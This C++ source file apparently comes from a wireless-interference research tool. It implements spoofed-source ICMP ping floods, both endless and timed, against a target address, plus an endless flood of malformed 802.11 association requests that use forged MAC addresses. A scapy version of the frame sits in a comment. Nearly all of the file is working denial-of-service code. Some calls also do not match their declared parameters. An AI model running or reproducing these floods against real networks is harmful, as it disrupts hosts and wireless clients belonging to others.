//
// Created by Kevin Messali on 11/03/23.
//

#include "rfi_generator.h"

rfi_generator::rfi_generator(const std::string &iface, const std::string &ip_address)
{
    this->target_address = ip_address;
    this->interface = iface;
    this->analyzer = new packet_analyzer(iface);
    pcpp::MacAddress hw_address;
    analyzer->get_hw_address(this->target_address, hw_address);
    this->target_hw_address = hw_address.toString();
    if (this->target_hw_address == "00:00:00:00:00:00")
    {
        std::cout << "Could not get the hardware address of the target." << std::endl;
        exit(1);
    }
}


rfi_generator::rfi_generator(const std::string &mon_iface)
{
    this->interface = mon_iface;
}

void rfi_generator::send_ping(int num_packets, int packet_size, int interval)
{
    std::random_device rd;
    // Random sequence sequence id
    auto seq_id = rd();
    auto *data = new uint8_t[packet_size];
    std::generate_n(data, packet_size, std::ref(rd));
    for (int i = 0; i < num_packets; i++)
    {
        pcpp::EthLayer eth_layer(pcpp::MacAddress(this->analyzer->get_current_device_hw_address()),
                                 pcpp::MacAddress(this->target_hw_address),
                                 PCPP_ETHERTYPE_IP);


        std::string from_ip = this->target_address.substr(0, this->target_address.find_last_of('.')) + ".254";
        pcpp::IPv4Layer ip_layer(pcpp::IPv4Address(from_ip), pcpp::IPv4Address(this->target_address));
        auto ip_id = rd();
        ip_layer.getIPv4Header()->ipId = htons(ip_id);
        ip_layer.getIPv4Header()->timeToLive = 64;

        auto duration = std::chrono::duration_cast<std::chrono::nanoseconds>(
                std::chrono::high_resolution_clock::now().time_since_epoch());
        auto seconds = std::chrono::duration_cast<std::chrono::seconds>(duration).count();
        auto nanoseconds_only = duration - std::chrono::seconds(seconds);
        auto timestamp = seconds << 32 | nanoseconds_only.count();

        pcpp::IcmpLayer icmp_layer;
        icmp_layer.setEchoRequestData(seq_id, i, __bswap_constant_64(timestamp), data, packet_size + 6);
        pcpp::Packet icmp_packet(50 + packet_size);
        icmp_packet.addLayer(&eth_layer);
        icmp_packet.addLayer(&ip_layer);
        icmp_packet.addLayer(&icmp_layer);
        icmp_packet.computeCalculateFields();
        //this->m_device->sendPacket(&icmp_packet);
        this->analyzer->send_packet(&icmp_packet);
        if (interval > 0)
            std::this_thread::sleep_for(std::chrono::milliseconds(interval));

    }
}

rfi_generator::~rfi_generator()
{
    //this->m_device->close();
    delete this->analyzer;
}

[[noreturn]] void rfi_generator::start_ping_flood(int packet_size, int interval)
{
    while (true)
    {
        this->send_ping(1, packet_size);
        if (interval > 0)
            std::this_thread::sleep_for(std::chrono::milliseconds(interval));
    }

}

void rfi_generator::start_ping_flood_duration(int packet_size, int duration, int interval)
{
    auto start = std::chrono::high_resolution_clock::now();
    auto end = start + std::chrono::milliseconds(duration);
    while (std::chrono::high_resolution_clock::now() < end)
    {
        this->send_ping(1, packet_size);
        if (interval > 0)
            std::this_thread::sleep_for(std::chrono::milliseconds(interval));
    }
    std::cout << "Ping flood finished" << std::endl;
    exit(0);

}

void rfi_generator::send_malformed_association_request_flood(const std::string &fake_victim1_hw_address,
                                                             const std::string &fake_victim2_hw_address,
                                                             int interval)
{
    /**
     * Python code to generate the malformed association request using scapy
     *
     * from scapy.all import *
     * def send_ping(iface, number_of_packets_to_send: int = 4, size_of_packet: int = 65000):
     *      cur_address = "b8:27:eb:59:79:b6"
     *      target_address = "b8:27:eb:39:85:a3"
     *      p = RadioTap() / Dot11(addr1=cur_address, addr2=target_address, addr3=target_address)
     *      sendp(p, count=number_of_packets_to_send, iface=interface)
     *      interface = "wlx00c0caa55b49"
     *      send_ping(interface, number_of_packets_to_send=1000, size_of_packet=1024)
     */
    Tins::RadioTap radio_tap;
    Tins::Dot11AssocRequest dot11;
    Tins::PacketSender sender;

    //this->analyzer->get_hw_address(fake_source_ip, fake_source_hw_address);

    dot11.addr1(fake_victim1_hw_address);
    dot11.addr2(fake_victim2_hw_address);
    dot11.addr3(fake_victim2_hw_address);

    while (true)
    {
        radio_tap.inner_pdu(dot11);
        sender.send(radio_tap, this->interface);
        if (interval > 0)
            std::this_thread::sleep_for(std::chrono::milliseconds(interval));
    }
}

